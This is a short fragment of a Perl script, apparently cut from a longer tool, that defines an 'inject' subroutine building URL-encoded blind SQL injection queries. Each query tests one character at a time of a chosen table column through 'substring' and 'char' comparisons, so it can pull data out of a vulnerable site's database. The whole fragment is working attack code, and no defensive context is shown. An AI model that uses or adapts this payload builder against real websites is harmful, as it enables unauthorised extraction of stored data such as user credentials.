sub inject {
my $site = $_[0];
my $tl = $_[1];
my $cl = $_[2];
my $a = $_[3];
my $b = $_[4];


$attack= "$site"."%20and%20substring((select%20"."$cl"."%20from%20$tl%20limit%200,1),"."$a".",1)=char("."$b".")/*";

